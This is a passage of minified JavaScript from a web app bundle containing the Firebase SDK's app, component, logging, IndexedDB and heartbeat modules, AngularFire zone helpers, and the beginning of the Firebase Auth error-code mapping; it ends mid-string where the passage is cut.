Rh=class{constructor(e,n){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=n,this.task.then(()=>{e(this)}).catch(r=>{this.error(r)})}next(e){this.forEachObserver(n=>{n.next(e)})}error(e){this.forEachObserver(n=>{n.error(e)}),this.close(e)}complete(){this.forEachObserver(e=>{e.complete()}),this.close()}subscribe(e,n,r){let i;if(e===void 0&&n===void 0&&r===void 0)throw new Error("Missing Observer.");wR(e,["next","error","complete"])?i=e:i={next:e,error:n,complete:r},i.next===void 0&&(i.next=Ah),i.error===void 0&&(i.error=Ah),i.complete===void 0&&(i.complete=Ah);let o=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then(()=>{try{this.finalError?i.error(this.finalError):i.complete()}catch{}}),this.observers.push(i),o}unsubscribeOne(e){this.observers===void 0||this.observers[e]===void 0||(delete this.observers[e],this.observerCount-=1,this.observerCount===0&&this.onNoObservers!==void 0&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let n=0;n<this.observers.length;n++)this.sendOne(n,e)}sendOne(e,n){this.task.then(()=>{if(this.observers!==void 0&&this.observers[e]!==void 0)try{n(this.observers[e])}catch(r){typeof console<"u"&&console.error&&console.error(r)}})}close(e){this.finalized||(this.finalized=!0,e!==void 0&&(this.finalError=e),this.task.then(()=>{this.observers=void 0,this.onNoObservers=void 0}))}};function wR(t,e){if(typeof t!="object"||t===null)return!1;for(let n of e)if(n in t&&typeof t[n]=="function")return!0;return!1}function Ah(){}function Dc(t,e){return`${t} failed: ${e} argument `}var RI=function(t){let e=[],n=0;for(let r=0;r<t.length;r++){let i=t.charCodeAt(r);if(i>=55296&&i<=56319){let o=i-55296;r++,m(r<t.length,"Surrogate pair missing trail surrogate.");let s=t.charCodeAt(r)-56320;i=65536+(o<<10)+s}i<128?e[n++]=i:i<2048?(e[n++]=i>>6|192,e[n++]=i&63|128):i<65536?(e[n++]=i>>12|224,e[n++]=i>>6&63|128,e[n++]=i&63|128):(e[n++]=i>>18|240,e[n++]=i>>12&63|128,e[n++]=i>>6&63|128,e[n++]=i&63|128)}return e},Bo=function(t){let e=0;for(let n=0;n<t.length;n++){let r=t.charCodeAt(n);r<128?e++:r<2048?e+=2:r>=55296&&r<=56319?(e+=4,n++):e+=3}return e};var H2=4*60*60*1e3;function xe(t){return t&&t._delegate?t._delegate:t}var qe=class{constructor(e,n,r){this.name=e,this.instanceFactory=n,this.type=r,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}};var tr="[DEFAULT]";var bc=class{constructor(e,n){this.name=e,this.container=n,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){let n=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(n)){let r=new yn;if(this.instancesDeferred.set(n,r),this.isInitialized(n)||this.shouldAutoInitialize())try{let i=this.getOrInitializeService({instanceIdentifier:n});i&&r.resolve(i)}catch{}}return this.instancesDeferred.get(n).promise}getImmediate(e){var n;let r=this.normalizeInstanceIdentifier(e?.identifier),i=(n=e?.optional)!==null&&n!==void 0?n:!1;if(this.isInitialized(r)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:r})}catch(o){if(i)return null;throw o}else{if(i)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(CR(e))try{this.getOrInitializeService({instanceIdentifier:tr})}catch{}for(let[n,r]of this.instancesDeferred.entries()){let i=this.normalizeInstanceIdentifier(n);try{let o=this.getOrInitializeService({instanceIdentifier:i});r.resolve(o)}catch{}}}}clearInstance(e=tr){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}delete(){return p(this,null,function*(){let e=Array.from(this.instances.values());yield Promise.all([...e.filter(n=>"INTERNAL"in n).map(n=>n.INTERNAL.delete()),...e.filter(n=>"_delete"in n).map(n=>n._delete())])})}isComponentSet(){return this.component!=null}isInitialized(e=tr){return this.instances.has(e)}getOptions(e=tr){return this.instancesOptions.get(e)||{}}initialize(e={}){let{options:n={}}=e,r=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(r))throw Error(`${this.name}(${r}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);let i=this.getOrInitializeService({instanceIdentifier:r,options:n});for(let[o,s]of this.instancesDeferred.entries()){let a=this.normalizeInstanceIdentifier(o);r===a&&s.resolve(i)}return i}onInit(e,n){var r;let i=this.normalizeInstanceIdentifier(n),o=(r=this.onInitCallbacks.get(i))!==null&&r!==void 0?r:new Set;o.add(e),this.onInitCallbacks.set(i,o);let s=this.instances.get(i);return s&&e(s,i),()=>{o.delete(e)}}invokeOnInitCallbacks(e,n){let r=this.onInitCallbacks.get(n);if(r)for(let i of r)try{i(e,n)}catch{}}getOrInitializeService({instanceIdentifier:e,options:n={}}){let r=this.instances.get(e);if(!r&&this.component&&(r=this.component.instanceFactory(this.container,{instanceIdentifier:ER(e),options:n}),this.instances.set(e,r),this.instancesOptions.set(e,n),this.invokeOnInitCallbacks(r,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,r)}catch{}return r||null}normalizeInstanceIdentifier(e=tr){return this.component?this.component.multipleInstances?e:tr:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}};function ER(t){return t===tr?void 0:t}function CR(t){return t.instantiationMode==="EAGER"}var $o=class{constructor(e){this.name=e,this.providers=new Map}addComponent(e){let n=this.getProvider(e.name);if(n.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);n.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);let n=new bc(e,this);return this.providers.set(e,n),n}getProviders(){return Array.from(this.providers.values())}};var DR=[],q=function(t){return t[t.DEBUG=0]="DEBUG",t[t.VERBOSE=1]="VERBOSE",t[t.INFO=2]="INFO",t[t.WARN=3]="WARN",t[t.ERROR=4]="ERROR",t[t.SILENT=5]="SILENT",t}(q||{}),bR={debug:q.DEBUG,verbose:q.VERBOSE,info:q.INFO,warn:q.WARN,error:q.ERROR,silent:q.SILENT},SR=q.INFO,TR={[q.DEBUG]:"log",[q.VERBOSE]:"log",[q.INFO]:"info",[q.WARN]:"warn",[q.ERROR]:"error"},AR=(t,e,...n)=>{if(e<t.logLevel)return;let r=new Date().toISOString(),i=TR[e];if(i)console[i](`[${r}]  ${t.name}:`,...n);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)},_n=class{constructor(e){this.name=e,this._logLevel=SR,this._logHandler=AR,this._userLogHandler=null,DR.push(this)}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in q))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?bR[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,q.DEBUG,...e),this._logHandler(this,q.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,q.VERBOSE,...e),this._logHandler(this,q.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,q.INFO,...e),this._logHandler(this,q.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,q.WARN,...e),this._logHandler(this,q.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,q.ERROR,...e),this._logHandler(this,q.ERROR,...e)}};var MR=(t,e)=>e.some(n=>t instanceof n),xI,OI;function NR(){return xI||(xI=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function RR(){return OI||(OI=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}var PI=new WeakMap,Vh=new WeakMap,kI=new WeakMap,Lh=new WeakMap,Uh=new WeakMap;function xR(t){let e=new Promise((n,r)=>{let i=()=>{t.removeEventListener("success",o),t.removeEventListener("error",s)},o=()=>{n(It(t.result)),i()},s=()=>{r(t.error),i()};t.addEventListener("success",o),t.addEventListener("error",s)});return e.then(n=>{n instanceof IDBCursor&&PI.set(n,t)}).catch(()=>{}),Uh.set(e,t),e}function OR(t){if(Vh.has(t))return;let e=new Promise((n,r)=>{let i=()=>{t.removeEventListener("complete",o),t.removeEventListener("error",s),t.removeEventListener("abort",s)},o=()=>{n(),i()},s=()=>{r(t.error||new DOMException("AbortError","AbortError")),i()};t.addEventListener("complete",o),t.addEventListener("error",s),t.addEventListener("abort",s)});Vh.set(t,e)}var jh={get(t,e,n){if(t instanceof IDBTransaction){if(e==="done")return Vh.get(t);if(e==="objectStoreNames")return t.objectStoreNames||kI.get(t);if(e==="store")return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return It(t[e])},set(t,e,n){return t[e]=n,!0},has(t,e){return t instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in t}};function FI(t){jh=t(jh)}function PR(t){return t===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...n){let r=t.call(Sc(this),e,...n);return kI.set(r,e.sort?e.sort():[e]),It(r)}:RR().includes(t)?function(...e){return t.apply(Sc(this),e),It(PI.get(this))}:function(...e){return It(t.apply(Sc(this),e))}}function kR(t){return typeof t=="function"?PR(t):(t instanceof IDBTransaction&&OR(t),MR(t,NR())?new Proxy(t,jh):t)}function It(t){if(t instanceof IDBRequest)return xR(t);if(Lh.has(t))return Lh.get(t);let e=kR(t);return e!==t&&(Lh.set(t,e),Uh.set(e,t)),e}var Sc=t=>Uh.get(t);function VI(t,e,{blocked:n,upgrade:r,blocking:i,terminated:o}={}){let s=indexedDB.open(t,e),a=It(s);return r&&s.addEventListener("upgradeneeded",c=>{r(It(s.result),c.oldVersion,c.newVersion,It(s.transaction),c)}),n&&s.addEventListener("blocked",c=>n(c.oldVersion,c.newVersion,c)),a.then(c=>{o&&c.addEventListener("close",()=>o()),i&&c.addEventListener("versionchange",l=>i(l.oldVersion,l.newVersion,l))}).catch(()=>{}),a}var FR=["get","getKey","getAll","getAllKeys","count"],LR=["put","add","delete","clear"],Bh=new Map;function LI(t,e){if(!(t instanceof IDBDatabase&&!(e in t)&&typeof e=="string"))return;if(Bh.get(e))return Bh.get(e);let n=e.replace(/FromIndex$/,""),r=e!==n,i=LR.includes(n);if(!(n in(r?IDBIndex:IDBObjectStore).prototype)||!(i||FR.includes(n)))return;let o=function(s,...a){return p(this,null,function*(){let c=this.transaction(s,i?"readwrite":"readonly"),l=c.store;return r&&(l=l.index(a.shift())),(yield Promise.all([l[n](...a),i&&c.done]))[0]})};return Bh.set(e,o),o}FI(t=>x(v({},t),{get:(e,n,r)=>LI(e,n)||t.get(e,n,r),has:(e,n)=>!!LI(e,n)||t.has(e,n)}));var Hh=class{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(n=>{if(VR(n)){let r=n.getImmediate();return`${r.library}/${r.version}`}else return null}).filter(n=>n).join(" ")}};function VR(t){let e=t.getComponent();return e?.type==="VERSION"}var Wh="@firebase/app",jI="0.10.13";var $t=new _n("@firebase/app"),jR="@firebase/app-compat",UR="@firebase/analytics-compat",BR="@firebase/analytics",$R="@firebase/app-check-compat",HR="@firebase/app-check",WR="@firebase/auth",zR="@firebase/auth-compat",GR="@firebase/database",qR="@firebase/data-connect",YR="@firebase/database-compat",KR="@firebase/functions",ZR="@firebase/functions-compat",QR="@firebase/installations",JR="@firebase/installations-compat",XR="@firebase/messaging",ex="@firebase/messaging-compat",tx="@firebase/performance",nx="@firebase/performance-compat",rx="@firebase/remote-config",ix="@firebase/remote-config-compat",ox="@firebase/storage",sx="@firebase/storage-compat",ax="@firebase/firestore",cx="@firebase/vertexai-preview",lx="@firebase/firestore-compat",ux="firebase",dx="10.14.1";var zh="[DEFAULT]",hx={[Wh]:"fire-core",[jR]:"fire-core-compat",[BR]:"fire-analytics",[UR]:"fire-analytics-compat",[HR]:"fire-app-check",[$R]:"fire-app-check-compat",[WR]:"fire-auth",[zR]:"fire-auth-compat",[GR]:"fire-rtdb",[qR]:"fire-data-connect",[YR]:"fire-rtdb-compat",[KR]:"fire-fn",[ZR]:"fire-fn-compat",[QR]:"fire-iid",[JR]:"fire-iid-compat",[XR]:"fire-fcm",[ex]:"fire-fcm-compat",[tx]:"fire-perf",[nx]:"fire-perf-compat",[rx]:"fire-rc",[ix]:"fire-rc-compat",[ox]:"fire-gcs",[sx]:"fire-gcs-compat",[ax]:"fire-fst",[lx]:"fire-fst-compat",[cx]:"fire-vertex","fire-js":"fire-js",[ux]:"fire-js-all"};var Ho=new Map,fx=new Map,Gh=new Map;function UI(t,e){try{t.container.addComponent(e)}catch(n){$t.debug(`Component ${e.name} failed to register with FirebaseApp ${t.name}`,n)}}function wn(t){let e=t.name;if(Gh.has(e))return $t.debug(`There were multiple attempts to register component ${e}.`),!1;Gh.set(e,t);for(let n of Ho.values())UI(n,t);for(let n of fx.values())UI(n,t);return!0}function zo(t,e){let n=t.container.getProvider("heartbeat").getImmediate({optional:!0});return n&&n.triggerHeartbeat(),t.container.getProvider(e)}function Ht(t){return t.settings!==void 0}var px={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},In=new Bt("app","Firebase",px);var qh=class{constructor(e,n,r){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},n),this._name=n.name,this._automaticDataCollectionEnabled=n.automaticDataCollectionEnabled,this._container=r,this.container.addComponent(new qe("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw In.create("app-deleted",{appName:this._name})}};var En=dx;function Zh(t,e={}){let n=t;typeof e!="object"&&(e={name:e});let r=Object.assign({name:zh,automaticDataCollectionEnabled:!1},e),i=r.name;if(typeof i!="string"||!i)throw In.create("bad-app-name",{appName:String(i)});if(n||(n=kh()),!n)throw In.create("no-options");let o=Ho.get(i);if(o){if(mi(n,o.options)&&mi(r,o.config))return o;throw In.create("duplicate-app",{appName:i})}let s=new $o(i);for(let c of Gh.values())s.addComponent(c);let a=new qh(n,r,s);return Ho.set(i,a),a}function vi(t=zh){let e=Ho.get(t);if(!e&&t===zh&&kh())return Zh();if(!e)throw In.create("no-app",{appName:t});return e}function Tc(){return Array.from(Ho.values())}function ue(t,e,n){var r;let i=(r=hx[t])!==null&&r!==void 0?r:t;n&&(i+=`-${n}`);let o=i.match(/\s|\//),s=e.match(/\s|\//);if(o||s){let a=[`Unable to register library "${i}" with version "${e}":`];o&&a.push(`library name "${i}" contains illegal characters (whitespace or "/")`),o&&s&&a.push("and"),s&&a.push(`version name "${e}" contains illegal characters (whitespace or "/")`),$t.warn(a.join(" "));return}wn(new qe(`${i}-version`,()=>({library:i,version:e}),"VERSION"))}var gx="firebase-heartbeat-database",mx=1,Wo="firebase-heartbeat-store",$h=null;function WI(){return $h||($h=VI(gx,mx,{upgrade:(t,e)=>{switch(e){case 0:try{t.createObjectStore(Wo)}catch(n){console.warn(n)}}}}).catch(t=>{throw In.create("idb-open",{originalErrorMessage:t.message})})),$h}function vx(t){return p(this,null,function*(){try{let n=(yield WI()).transaction(Wo),r=yield n.objectStore(Wo).get(zI(t));return yield n.done,r}catch(e){if(e instanceof ot)$t.warn(e.message);else{let n=In.create("idb-get",{originalErrorMessage:e?.message});$t.warn(n.message)}}})}function BI(t,e){return p(this,null,function*(){try{let r=(yield WI()).transaction(Wo,"readwrite");yield r.objectStore(Wo).put(e,zI(t)),yield r.done}catch(n){if(n instanceof ot)$t.warn(n.message);else{let r=In.create("idb-set",{originalErrorMessage:n?.message});$t.warn(r.message)}}})}function zI(t){return`${t.name}!${t.options.appId}`}var yx=1024,_x=30*24*60*60*1e3,Yh=class{constructor(e){this.container=e,this._heartbeatsCache=null;let n=this.container.getProvider("app").getImmediate();this._storage=new Kh(n),this._heartbeatsCachePromise=this._storage.read().then(r=>(this._heartbeatsCache=r,r))}triggerHeartbeat(){return p(this,null,function*(){var e,n;try{let i=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),o=$I();return((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null&&(this._heartbeatsCache=yield this._heartbeatsCachePromise,((n=this._heartbeatsCache)===null||n===void 0?void 0:n.heartbeats)==null)||this._heartbeatsCache.lastSentHeartbeatDate===o||this._heartbeatsCache.heartbeats.some(s=>s.date===o)?void 0:(this._heartbeatsCache.heartbeats.push({date:o,agent:i}),this._heartbeatsCache.heartbeats=this._heartbeatsCache.heartbeats.filter(s=>{let a=new Date(s.date).valueOf();return Date.now()-a<=_x}),this._storage.overwrite(this._heartbeatsCache))}catch(r){$t.warn(r)}})}getHeartbeatsHeader(){return p(this,null,function*(){var e;try{if(this._heartbeatsCache===null&&(yield this._heartbeatsCachePromise),((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null||this._heartbeatsCache.heartbeats.length===0)return"";let n=$I(),{heartbeatsToSend:r,unsentEntries:i}=Ix(this._heartbeatsCache.heartbeats),o=Fo(JSON.stringify({version:2,heartbeats:r}));return this._heartbeatsCache.lastSentHeartbeatDate=n,i.length>0?(this._heartbeatsCache.heartbeats=i,yield this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),o}catch(n){return $t.warn(n),""}})}};function $I(){return new Date().toISOString().substring(0,10)}function Ix(t,e=yx){let n=[],r=t.slice();for(let i of t){let o=n.find(s=>s.agent===i.agent);if(o){if(o.dates.push(i.date),HI(n)>e){o.dates.pop();break}}else if(n.push({agent:i.agent,dates:[i.date]}),HI(n)>e){n.pop();break}r=r.slice(1)}return{heartbeatsToSend:n,unsentEntries:r}}var Kh=class{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}runIndexedDBEnvironmentCheck(){return p(this,null,function*(){return bI()?SI().then(()=>!0).catch(()=>!1):!1})}read(){return p(this,null,function*(){if(yield this._canUseIndexedDBPromise){let n=yield vx(this.app);return n?.heartbeats?n:{heartbeats:[]}}else return{heartbeats:[]}})}overwrite(e){return p(this,null,function*(){var n;if(yield this._canUseIndexedDBPromise){let i=yield this.read();return BI(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:i.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return})}add(e){return p(this,null,function*(){var n;if(yield this._canUseIndexedDBPromise){let i=yield this.read();return BI(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:i.lastSentHeartbeatDate,heartbeats:[...i.heartbeats,...e.heartbeats]})}else return})}};function HI(t){return Fo(JSON.stringify({version:2,heartbeats:t})).length}function wx(t){wn(new qe("platform-logger",e=>new Hh(e),"PRIVATE")),wn(new qe("heartbeat",e=>new Yh(e),"PRIVATE")),ue(Wh,jI,t),ue(Wh,jI,"esm2017"),ue("fire-js","")}wx("");var Ex="firebase",Cx="10.14.1";ue(Ex,Cx,"app");var rr=new Nt("ANGULARFIRE2_VERSION");function Mc(t,e,n){if(e){if(e.length===1)return e[0];let o=e.filter(s=>s.app===n);if(o.length===1)return o[0]}return n.container.getProvider(t).getImmediate({optional:!0})}var Go=(t,e)=>{let n=e?[e]:Tc(),r=[];return n.forEach(i=>{i.container.getProvider(t).instances.forEach(s=>{r.includes(s)||r.push(s)})}),r},_i=class{constructor(){return Go(Dx)}},Dx="app-check";function yi(){}var Ac=class{zone;delegate;constructor(e,n=kl){this.zone=e,this.delegate=n}now(){return this.delegate.now()}schedule(e,n,r){let i=this.zone,o=function(s){i.runGuarded(()=>{e.apply(this,[s])})};return this.delegate.schedule(o,n,r)}},Qh=class{zone;task=null;constructor(e){this.zone=e}call(e,n){let r=this.unscheduleTask.bind(this);return this.task=this.zone.run(()=>Zone.current.scheduleMacroTask("firebaseZoneBlock",yi,{},yi,yi)),n.pipe(le({next:r,complete:r,error:r})).subscribe(e).add(r)}unscheduleTask(){setTimeout(()=>{this.task!=null&&this.task.state==="scheduled"&&(this.task.invoke(),this.task=null)},10)}},Ii=(()=>{class t{ngZone;outsideAngular;insideAngular;constructor(n){this.ngZone=n,this.outsideAngular=n.runOutsideAngular(()=>new Ac(Zone.current)),this.insideAngular=n.run(()=>new Ac(Zone.current,Pl)),globalThis.\u0275AngularFireScheduler||=this}static \u0275fac=function(r){return new(r||t)(N(Y))};static \u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}return t})();function Nc(){let t=globalThis.\u0275AngularFireScheduler;if(!t)throw new Error(`Either AngularFireModule has not been provided in your AppModule (this can be done manually or implictly using
provideFirebaseApp) or you're calling an AngularFire method outside of an NgModule (which is not supported).`);return t}function bx(t){return Nc().ngZone.runOutsideAngular(()=>t())}function nr(t){return Nc().ngZone.run(()=>t())}function Sx(t){return Tx(Nc())(t)}function Tx(t){return function(n){return n=n.lift(new Qh(t.ngZone)),n.pipe(en(t.outsideAngular),Xt(t.insideAngular))}}var Ax=(t,e)=>function(){let r=arguments;return e&&setTimeout(()=>{e.state==="scheduled"&&e.invoke()},10),nr(()=>t.apply(void 0,r))},Wt=(t,e)=>function(){let n,r=arguments;for(let o=0;o<arguments.length;o++)typeof r[o]=="function"&&(e&&(n||=nr(()=>Zone.current.scheduleMacroTask("firebaseZoneBlock",yi,{},yi,yi))),r[o]=Ax(r[o],n));let i=bx(()=>t.apply(this,r));if(!e)if(i instanceof V){let o=Nc();return i.pipe(en(o.outsideAngular),Xt(o.insideAngular))}else return nr(()=>i);return i instanceof V?i.pipe(Sx):i instanceof Promise?nr(()=>new Promise((o,s)=>i.then(a=>nr(()=>o(a)),a=>nr(()=>s(a))))):typeof i=="function"&&n?function(){return setTimeout(()=>{n&&n.state==="scheduled"&&n.invoke()},10),i.apply(this,arguments)}:nr(()=>i)};var zt=class{constructor(e){return e}},ir=class{constructor(){return Tc()}};function Mx(t){return t&&t.length===1?t[0]:new zt(vi())}var Jh=new I("angularfire2._apps"),Nx={provide:zt,useFactory:Mx,deps:[[new Ne,Jh]]},Rx={provide:ir,deps:[[new Ne,Jh]]};function xx(t){return(e,n)=>{let r=n.get(hn);ue("angularfire",rr.full,"core"),ue("angularfire",rr.full,"app"),ue("angular",Iy.full,r.toString());let i=e.runOutsideAngular(()=>t(n));return new zt(i)}}function GI(t,...e){return gt([Nx,Rx,{provide:Jh,useFactory:xx(t),multi:!0,deps:[Y,Me,Ii,...e]}])}var qI=Wt(Zh,!0);function cw(){return{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}}var lw=cw,uw=new Bt("auth","Firebase",cw());var Fc=new _n("@firebase/auth");function Ox(t,...e){Fc.logLevel<=q.WARN&&Fc.warn(`Auth (${En}): ${t}`,...e)}function xc(t,...e){Fc.logLevel<=q.ERROR&&Fc.error(`Auth (${En}): ${t}`,...e)}function Dn(t,...e){throw _f(t,...e)}function sr(t,...e){return _f(t,...e)}function dw(t,e,n){let r=Object.assign(Object.assign({},lw()),{[e]:n});return new Bt("auth","Firebase",r).create(e,{appName:t.name})}function or(t){return dw(t,"operation-not-supported-in-this-environment","Operations that alter the current user are not supported in conjunction with FirebaseServerApp")}function _f(t,...e){if(typeof t!="string"){let n=e[0],r=[...e.slice(1)];return r[0]&&(r[0].appName=t.name),t._errorFactory.create(n,...r)}return uw.create(t,...e)}function D(t,e,...n){if(!t)throw _f(e,...n)}function Gt(t){let e="INTERNAL ASSERTION FAILED: "+t;throw xc(e),new Error(e)}function bn(t,e){t||Gt(e)}function nf(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.href)||""}function Px(){return YI()==="http:"||YI()==="https:"}function YI(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.protocol)||null}function kx(){return typeof navigator<"u"&&navigator&&"onLine"in navigator&&typeof navigator.onLine=="boolean"&&(Px()||CI()||"connection"in navigator)?navigator.onLine:!0}function Fx(){if(typeof navigator>"u")return null;let t=navigator;return t.languages&&t.languages[0]||t.language||null}var ar=class{constructor(e,n){this.shortDelay=e,this.longDelay=n,bn(n>e,"Short delay should be less than long delay!"),this.isMobile=Vo()||Cc()}get(){return kx()?this.isMobile?this.longDelay:this.shortDelay:Math.min(5e3,this.shortDelay)}};function If(t,e){bn(t.emulator,"Emulator should always be set here");let{url:n}=t.emulator;return e?`${n}${e.startsWith("/")?e.slice(1):e}`:n}var Lc=class{static initialize(e,n,r){this.fetchImpl=e,n&&(this.headersImpl=n),r&&(this.responseImpl=r)}static fetch(){if(this.fetchImpl)return this.fetchImpl;if(typeof self<"u"&&"fetch"in self)return self.fetch;if(typeof globalThis<"u"&&globalThis.fetch)return globalThis.fetch;if(typeof fetch<"u")return fetch;Gt("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){if(this.headersImpl)return this.headersImpl;if(typeof self<"u"&&"Headers"in self)return self.Headers;if(typeof globalThis<"u"&&globalThis.Headers)return globalThis.Headers;if(typeof Headers<"u")return Headers;Gt("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){if(this.responseImpl)return this.responseImpl;if(typeof self<"u"&&"Response"in self)return self.Response;if(typeof globalThis<"u"&&globalThis.Response)return globalThis.Response;if(typeof Response<"u")return Response;Gt("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}};var Lx={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",INVALID_LOGIN_CREDENTIALS:"invalid-credential",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",PASSWORD_DOES_NOT_MEET_REQUIREMENTS:"password-does-not-meet-requirements",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error",RECAPTCHA_NOT_ENABLED:"recaptcha-not-enabled",MISSING_RECAPTCHA_TOKEN:"missing-recaptcha-token",INVALID_RECAPTC